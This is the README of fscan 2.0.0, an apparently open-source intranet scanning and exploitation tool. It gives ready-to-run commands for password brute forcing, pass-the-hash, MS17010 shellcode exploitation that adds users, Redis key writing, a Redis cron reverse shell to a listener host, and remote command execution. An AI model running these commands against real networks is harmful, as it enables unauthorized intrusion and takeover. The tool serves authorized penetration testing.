# Fscan 2.0.0
[English](README.md) | [中文](README_CN.md)

# 1. Introduction
An intranet comprehensive scanning tool, designed for automated and comprehensive vulnerability scanning of internal networks. 
It supports host survival detection, port scanning, common service brute force, ms17010 vulnerability detection, Redis batch public key writing, scheduled task rebound shell, Windows network card information collection, web fingerprint identification, web vulnerability scanning, NetBIOS detection, domain controller identification, and many other functions.

# 2. Functions
1. Information collection:
   * Host survival detection (ICMP)
   * Port scanning

2. Brute force attacks:
   * Various service password brute forcing (SSH, SMB, RDP, etc.)
   * Database password brute forcing (MySQL, MSSQL, Redis, PostgreSQL, Oracle, etc.)

3. System information and vulnerability scanning:
   * NetBIOS detection and domain controller identification
   * Network Interface Card (NIC) information collection
   * High-risk vulnerability scanning (MS17010, etc.)

4. Web detection:
   * Web title detection
   * Web fingerprinting (CMS, OA frameworks, etc.)
   * Web vulnerability scanning (WebLogic, Struts2, etc., also supports XRay POC)

5. Exploitation:
   * Redis public key writing and scheduled task creation
   * SSH command execution
   * MS17010 vulnerability exploitation (shellcode implantation), such as adding users

6. Other features:
   * Save output results to file

# 3. Instructions
### Getting Started
```
fscan.exe -h 192.168.1.1/24
fscan.exe -h 192.168.1.1/16
```

### Advanced Usage
```
fscan.exe -h 192.168.1.1/24 -np -no -nopoc    # Skip survival detection, do not save output, skip web POC scanning
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub    # Redis write public key
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666    # Redis scheduled task rebound shell
fscan.exe -h 192.168.1.1/24 -c whoami    # Execute SSH command
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222    # Specify SSH module and port
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt    # Load usernames and passwords from files
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt    # Specify output file path (default is current directory)
fscan.exe -h 192.168.1.1/8    # Scan the first and last IP of each C segment for quick network segment assessment
fscan.exe -h 192.168.1.1/24 -m smb -pwd password    # SMB password brute force
fscan.exe -h 192.168.1.1/24 -m ms17010    # Scan for MS17010 vulnerability
fscan.exe -hf ip.txt    # Import targets from file
fscan.exe -u http://baidu.com -proxy 8080    # Scan a URL with HTTP proxy
fscan.exe -h 192.168.1.1/24 -nobr -nopoc    # Skip brute force and web POC scanning to reduce traffic
fscan.exe -h 192.168.1.1/24 -pa 3389    # Add RDP scanning (port 3389)
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080    # Use SOCKS5 proxy (only for basic TCP functions)
fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add    # Use MS17010 to add a user
fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx    # SMB hash pass-the-hash
fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx    # WMI command execution (no echo)
fscan.exe -h 192.168.1.1/24 -m webonly    # Skip port scanning and directly scan web services
```

### Compilation Instructions
```
go build -ldflags="-s -w " -trimpath main.go
upx -9 fscan.exe    # Optional, for compression
```

### Installation for Arch Linux Users
```
yay -S fscan-git  # or paru -S fscan-git
```

### Complete Parameter List
```
Usage of ./fscan:
  -br int
        Brute force threads (default 1)
  -c string
        Execute command (ssh|wmiexec)
  -cookie string
        Set POC cookie, e.g., -cookie rememberMe=login
  -debug int
        Log error frequency (default 60)
  -dns
        Use DNS log for POC
  -domain string
        SMB domain
  -full
        Full POC scan, e.g., all 100 Shiro keys
  -h string
        Target IP address range, e.g., 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hash string
        NTLM hash for pass-the-hash
  -hf string
        Host file, e.g., -hf ip.txt
  -hn string
        Hosts to exclude, e.g., -hn 192.168.1.1/24
  -m string
        Select scan module, e.g., -m ssh (default "all")
  -no
        Do not save output log
  -nobr
        Do not perform brute force password attacks
  -nopoc
        Do not scan for web vulnerabilities
  -np
        Do not perform ping checks
  -num int
        POC scan rate (default 20)
  -o string
        Output file (default "result.txt")
  -p string
        Port selection, e.g., 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
  -pa string
        Add ports to default port list, e.g., -pa 3389
  -path string
        Remote file path for FCGI, SMB
  -ping
        Use ping instead of ICMP
  -pn string
        Ports to exclude, e.g., -pn 445
  -pocname string
        Filter POCs by name, e.g., -pocname weblogic
  -pocpath string
        POC file path
  -portf string
        Port file
  -proxy string
        Set HTTP proxy for POC, e.g., -proxy http://127.0.0.1:8080
  -pwd string
        Password
  -pwda string
        Add password to default list, e.g., -pwda password
  -pwdf string
        Password file
  -rf string
        Redis file to write SSH key, e.g., -rf id_rsa.pub
  -rs string
        Redis shell for cron job, e.g., -rs 192.168.1.1:6666
  -sc string
        MS17010 shellcode action, e.g., -sc add
  -silent
        Silent scan mode
  -socks5 string
        SOCKS5 proxy for TCP connections (timeout settings won't work with proxy)
  -sshkey string
        SSH private key file (id_rsa)
  -t int
        Number of threads (default 600)
  -time int
        Connection timeout in seconds (default 3)
  -top int
        Show top N live hosts (default 10)
  -u string
        URL to scan
  -uf string
        URL file
  -user string
        Username
  -usera string
        Add username to default list, e.g., -usera user
  -userf string
        Username file
  -wmi
        Use WMI
  -wt int
        Web request timeout in seconds (default 5)
```

# 4. Demo Screenshots

`fscan.exe -h 192.168.x.x  (Full scan with MS17010, NIC information)`
![](image/1.png)

![](image/4.png)

`fscan.exe -h 192.168.x.x -rf id_rsa.pub (Redis write public key)`
![](image/2.png)

`fscan.exe -h 192.168.x.x -c "whoami;id" (SSH command execution)`
![](image/3.png)

`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 (XRay POC support)`
![](image/2020-12-12-13-34-44.png)

`fscan.exe -h 192.168.x.x -p 139 (NetBIOS and domain controller detection, [+]DC indicates domain controller)`
![](image/netbios.png)

`go run .\main.go -h 192.168.x.x/24 -m netbios (Show complete NetBIOS information)`
![](image/netbios1.png)

`go run .\main.go -h 192.0.0.0/8 -m icmp (Network segmentation summary)`
![](image/live.png)

# 5. Disclaimer

This tool is intended **only for legally authorized** enterprise security testing activities. If you want to test this tool, please set up your own target environment.

To prevent malicious use, all POCs included in this project are theoretical vulnerability assessments and do not exploit vulnerabilities or launch actual attacks against targets.

When using this tool, ensure your actions comply with local laws and regulations and that you have obtained proper authorization. **Do not scan unauthorized targets**.

If you engage in any illegal activities while using this tool, you bear full responsibility for the consequences. We accept no legal or joint liability.

Before installing and using this tool, please **carefully read and fully understand all terms of this agreement**. Important clauses regarding limitations, exemptions, and your rights may be highlighted in bold or underlined text.

Unless you have fully read, understood, and accepted all terms of this agreement, do not install or use this tool. Your use of this tool or acceptance of this agreement in any express or implied manner constitutes your agreement to be bound by these terms.

# 6. 404StarLink 2.0 - Galaxy
![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

Fscan is a member of the 404Team [404StarLink2.0](https://github.com/knownsec/404StarLink2.0-Galaxy) project. If you have questions about fscan or want to connect with other users, you can join the community:

- [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)

# 7. Star Chart
[![Stargazers over time](https://starchart.cc/shadow1ng/fscan.svg)](https://starchart.cc/shadow1ng/fscan)

# 8. Donation
If you find this project helpful, you can buy the author a drink 🍹 [click here](image/sponsor.png)

# 9. Reference Links
https://github.com/Adminisme/ServerScan  
https://github.com/netxfly/x-crack  
https://github.com/hack2fun/Gscan  
https://github.com/k8gege/LadonGo   
https://github.com/jjf012/gopoc

# 10. Version History
- **2022/11/19** - Added hash collision and wmiexec command execution without echo
- **2022/07/14** - Added -hf parameter support for host:port format, changed rule.Search regular matching to include headers+body
- **2022/07/06** - Added manual garbage collection, URL comma separation support, fixed POC module bugs
- **2022/07/02** - Enhanced POC fuzzy module, added MS17010 exploitation with shellcode, added support for socks5 proxy
- **2022/04/20** - Added -path parameter for custom POC paths, -portf for port files, improved RDP module multithreading
- **2022/02/25** - Added -m webonly option to skip port scanning
- **2022/01/11** - Added Oracle password brute force support
- **2022/01/07** - Improved scanning for /8 networks, added LiveTop function to show top active segments
- **2021/12/07** - Added RDP scanning and -pa port parameter
- **2021/12/01** - Optimized XRay parsing, added HTTPS detection, improved IP parsing, added Docker unauthorized access detection
- **2021/06/18** - Improved POC mechanism based on fingerprint identification
- **2021/05/29** - Added FCGI unauthorized command execution, SSH private key authentication
- **2021/05/15** - Added Win03 version, silent scanning mode, web fingerprinting, fixed NetBIOS module
- **2021/05/06** - Updated module libraries, POCs, and fingerprints, improved thread processing
- **2021/04/22** - Modified webtitle module with GBK decoding
- **2021/04/21** - Added NetBIOS detection and domain controller identification
- **2021/03/04** - Added support for URL scanning with -u and -uf parameters
- **2021/02/25** - Modified YAML parsing for password brute force attacks
- **2021/02/08** - Added fingerprint identification for common CMS and frameworks
- **2021/02/05** - Improved ICMP packet handling for large-scale scanning
- **2020/12/12** - Added YAML parsing engine supporting XRay POCs
- **2020/12/06** - Optimized ICMP module, added -domain parameter for SMB
- **2020/12/03** - Improved IP range processing, ICMP and port scanning modules
- **2020/11/17** - Added -ping parameter as alternative to ICMP, added WebScan module and Shiro detection
- **2020/11/16** - Optimized ICMP module with -it parameter
- **2020/11/15** - Added support for importing IPs from file with -hf